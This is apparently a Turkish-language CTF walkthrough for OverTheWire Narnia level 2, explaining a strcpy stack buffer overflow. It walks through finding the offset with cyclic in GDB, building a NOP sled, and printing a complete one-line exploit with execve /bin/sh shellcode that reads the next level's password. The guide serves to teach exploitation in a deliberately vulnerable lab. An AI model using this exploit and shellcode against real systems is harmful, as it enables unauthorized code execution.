# 💥 OverTheWire Narnia — Level 2 → Level 3
## Stack Buffer Overflow → EIP Kontrolü + NOP Sled

> İlk gerçek "kod akışını ele geçirme" level'ı. Bir buffer'ı taşırıp
> **dönüş adresini (Saved EIP)** ezeceğiz ve işlemciyi kendi shellcode'umuza
> atlatacağız. Adresi tam bilemediğimiz için araya bir **NOP sled** koyup
> isabet payımızı büyüteceğiz.

| | |
|---|---|
| **Bağlantı** | `ssh narnia2@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia2.c` · binary: `/narnia/narnia2` |
| **Kavram** | `strcpy` overflow → Saved EIP üzerine yazma → NOP sled + shellcode |
| **Zorluk** | ⭐⭐⭐☆☆ |

**Bu level için gereken konular:**
- [`03_eip_register_kontrolu.md`](../../konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md) — Saved EIP, offset bulma (cyclic)
- [`04_shellcode_ve_nop_sled.md`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md) — shellcode + NOP sled
- [`02_little_endian.md`](../../konu_anlatimlari/binary_exploitation/02_little_endian.md) — dönüş adresini ters yazmak

---

## 🎯 Hedef

Program, komut satırı argümanını sınır kontrolü yapmadan 128 byte'lık bir buffer'a kopyalıyor. Bu buffer'ı taşırıp **dönüş adresini** kendi shellcode'umuzun bulunduğu yere yönlendireceğiz; `main` döndüğünde işlemci shellcode'u çalıştırıp bize narnia3 yetkili shell verecek.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf, argv[1]);   // ← AÇIK: argv[1]'i buf'a kopyalar, boyut kontrolü YOK
    printf("%s", buf);

    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık Nerede?

```c
char buf[128];
strcpy(buf, argv[1]);   // sınır yok
```

`strcpy`, kaynağı (`argv[1]`) hedefe (`buf`) **null byte görene kadar** kopyalar; hedefin boyutuna bakmaz. `argv[1]` 128 byte'tan uzunsa fazlalık `buf`'ın ötesine taşar — sırasıyla kaydedilmiş EBP'yi ve **kaydedilmiş dönüş adresini (Saved EIP)** ezer.

İki kritik nokta:

- **Girdi `argv[1]`'den gelir, STDIN'den DEĞİL.** Bu yüzden payload'u `./narnia2 "$(python3 ...)"` şeklinde **argüman olarak** veriyoruz; `| ./narnia2` (pipe) ile değil. Pipe ile verirsen `argc == 1` olur ve program "Usage" basıp çıkar.
- **EIP ezilmesi `main` DÖNERKEN tetiklenir.** `strcpy` kopyalar, `printf` basar, sonra `main`'in epilogue'u (`leave; ret`) çalışır — işte o `ret`, bizim ezdiğimiz Saved EIP'yi yükler ve oraya atlar.

---

## 📚 Gereken Teori (özet)

**Saved EIP ve overflow.** Fonksiyon çağrılırken dönüş adresi stack'e konur. Stack düzeni:

```
[ buf: 128 byte ][ ...dolgu... ][ Saved EBP: 4 ][ Saved EIP: 4 ]
^buf başı                                        ^ezersek RET buraya atlar
```

Buffer'ın başından Saved EIP'ye olan mesafeye **offset** diyoruz. Teorik olarak `128 + 4 = 132` görünür ama derleyici hizalaması yüzünden bu binary'de sık sık **140** çıkar (bazı derlemelerde 132). **Sayıyı tahmin etme — `cyclic` ile bul.**

**NOP sled (`\x90`).** "No operation" byte'ı; işlemci hiçbir şey yapmadan bir sonrakine geçer. Shellcode'un önüne yüzlerce `\x90` koyarsak, dönüş adresini **NOP bölgesinin herhangi bir yerine** isabet ettirmemiz yeter — işlemci kayarak shellcode'a iner. Bu, adresteki birkaç byte'lık belirsizliği tolere etmemizi sağlar.

```
[ NOP NOP ... NOP ][ SHELLCODE ][ RET_ADDR ]
        ↑ RET buraya (ortaya) atlasın → kayar → shellcode çalışır
```

---

## 🧪 Adım Adım (GDB)

### Adım 1 — Offset'i `cyclic` ile bul

`cyclic`, her 4 byte'lık penceresi benzersiz olan bir desen üretir; segfault'ta EIP'ye düşen değeri desende arayıp offset'i kesin buluruz.

```bash
narnia2@narnia:/narnia$ gdb -q ./narnia2
(gdb) set disassembly-flavor intel

# pwndbg/GEF varsa:
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaa...
pwndbg> run aaaabaaacaaadaaaeaaa...        # deseni ARGÜMAN olarak ver
Program received signal SIGSEGV, Segmentation fault.
0x6261616b in ?? ()                        # ← EIP "kaab" desen parçasıyla ezildi
pwndbg> cyclic -l 0x6261616b
140                                         # ← offset = 140 (sende 132 olabilir!)
```

pwndbg/GEF yoksa pwntools ile:
```bash
python3 -c "from pwn import *; print(cyclic(200).decode())"      # deseni üret
# segfault'taki EIP değerini al, sonra:
python3 -c "from pwn import *; print(cyclic_find(0x6261616b))"   # → offset
```

> ⚠️ Offset'i **kendi binary'inde** doğrula. Aşağıda `140` kullanıyorum; sende 132 çıkarsa NOP sayısını ona göre değiştir.

### Adım 2 — Buffer'ın stack adresini bul

Shellcode'u buffer'ın içine koyacağız; dönüş adresinin nereyi göstereceğini bilmek için buffer nerede başlıyor öğrenelim:

```bash
pwndbg> run $(python3 -c 'print("A"*140)')
pwndbg> x/40wx $esp
0xffffd830: 0x41414141 0x41414141 0x41414141 0x41414141   # ← buffer burada (~0xffffd830)
0xffffd840: 0x41414141 ...
```

Buffer kabaca `0xffffd830`'dan başlıyor. NOP sled'in **ortasına** nişan alacağız (örneğin `0xffffd850`), tabanına değil — birkaç byte kayma olursa yine sled'e düşelim.

### Adım 3 — Payload'u kur

```
yapı:  [ NOP * 115 ] + [ shellcode 25 byte ] + [ RET_ADDR 4 byte ]
        └── 115 + 25 = 140 = offset ──┘         └ Saved EIP'yi ezer ┘

NOP sayısı = offset - len(shellcode) = 140 - 25 = 115
RET_ADDR   = NOP bölgesinde bir adres (ortaya nişanla) = 0xffffd850 → \x50\xd8\xff\xff
```

---

## ▶️ Çalıştırma

```bash
narnia2@narnia:/narnia$ ./narnia2 "$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*115 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + b"\x50\xd8\xff\xff")')"
$ cat /etc/narnia_pass/narnia3
<şifre buraya gelir>
```

Şifreyi okuduysan tamamdır. Okuyamadıysan büyük ihtimalle dönüş adresin NOP sled'e isabet etmedi — aşağıdaki tuzaklara bak.

---

## ⚠️ En Kritik Tuzak: GDB Adresi ≠ Gerçek Adres

Bu, acemilerin en çok takıldığı yer. GDB, programı çalıştırırken **kendi environment variable'larını** ve **farklı bir `argv[0]`** enjekte eder. Bunlar stack'in başlangıcını kaydırdığı için, buffer'ın GDB içindeki adresi (`0xffffd830`) ile `./narnia2`'yi **doğrudan** çalıştırınca oluşan adres **birkaç on byte farklı** olur.

Bu yüzden:
1. **Dönüş adresini NOP sled'in ortasına nişanla** (tabanına değil) → birkaç byte kayma tolere edilir.
2. Tutmuyorsa **adresi birkaç değer deneyerek ayarla**: `0xffffd840`, `0xffffd850`, `0xffffd860`...
3. NOP sled'i büyük tut (burada 115 byte zaten bol) → isabet penceresi genişler.

> 💡 İpucu: GDB ve gerçek çalıştırma arasındaki farkı azaltmak için her ikisini de aynı şekilde (aynı argv uzunluğuyla) çalıştırmak yardımcı olur, ama en pratiği büyük sled + ortaya nişan + birkaç deneme.

---

## ⚠️ Diğer Yaygın Hatalar

**1. Payload'u pipe'la vermek.** `| ./narnia2` YANLIŞ — narnia2 `argv[1]` okur. `./narnia2 "$(...)"` kullan.

**2. Offset'i sabit varsaymak.** 132 ve 140 ikisi de mümkün. `cyclic -l` ile kendi değerini bul; NOP sayısı = `offset - 25`.

**3. `print()` ile ham byte göndermek.** Shellcode ve `\x90` bozulur. `sys.stdout.buffer.write(b"...")` kullan.

**4. Dönüş adresini sled'in tabanına nişanlamak.** Birkaç byte kayınca sled'i ıskalarsın. Ortaya nişanla.

**5. Yetki düştüyse şifreyi okuyamamak.** narnia2'de `setreuid` yok; shell açılınca `euid` narnia3 olduğu için `cat /etc/narnia_pass/narnia3` çalışır. "Permission denied" alırsan shellcode'a `setreuid(geteuid(),geteuid())` ekleyen varyant kullan.

---

## ✅ Ne Öğrendik

- Sınırsız `strcpy`, buffer'ı taşırıp **Saved EIP**'yi ezmeye izin verir; `ret` ile kod akışını ele geçiririz.
- EIP hijack `main` **dönerken** tetiklenir (`leave; ret`).
- **NOP sled**, adresteki belirsizliği tolere etmek için shellcode'un önüne konan iniş pistidir; dönüş adresini sled'in **ortasına** nişanlarız.
- **GDB'deki adres gerçek çalıştırmadan farklıdır** — büyük sled + ortaya nişan + birkaç deneme bunu yener.
- Offset derleyiciye bağlıdır; **cyclic ile doğrulanır**, tahmin edilmez.

Bir sonraki level overflow'u bambaşka bir amaçla kullanıyor: kod akışını değil, bir **dosya yolunu** ezip sembolik link ile şifreyi kopyalatacağız.

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 1 → Level 2 — Environment Variable Shellcode](./narnia_1-2.md)
- **Sonraki:** [Level 3 → Level 4 — Buffer Overflow + Sembolik Link](./narnia_3-4.md)

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
